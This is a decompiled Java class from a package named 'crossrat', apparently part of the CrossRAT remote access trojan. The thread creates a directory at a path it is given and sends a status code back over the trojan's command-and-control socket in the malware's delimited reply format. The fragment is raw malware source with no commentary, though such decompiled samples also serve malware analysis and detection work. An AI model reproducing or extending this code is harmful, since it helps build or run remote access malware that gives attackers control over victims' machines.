/*
 * Decompiled with CFR 0_124.
 */
package crossrat;

import crossrat.k;
import java.io.DataOutputStream;
import java.io.File;
import java.io.OutputStream;
import java.net.Socket;

final class a
extends Thread {
    private String a;
    private String b = null;

    public a(String string) {
        this.a = string;
    }

    @Override
    public final void run() {
        File file = new File(this.a);
        DataOutputStream dataOutputStream = null;
        try {
            dataOutputStream = new DataOutputStream(k.k.getOutputStream());
        }
        catch (Exception exception) {
            Exception exception2 = exception;
            exception.printStackTrace();
        }
        if (!file.exists()) {
            boolean bl;
            try {
                file.mkdir();
                bl = true;
            }
            catch (SecurityException securityException) {
                bl = false;
                this.b = "0";
            }
            if (bl) {
                this.b = "1";
            }
        } else {
            this.b = "2";
        }
        try {
            dataOutputStream.writeBytes(String.valueOf(k.g) + k.d + k.D + k.d + this.b + k.d + "&&&");
            return;
        }
        catch (Exception exception) {
            Exception exception3 = exception;
            exception.printStackTrace();
            return;
        }
    }
}
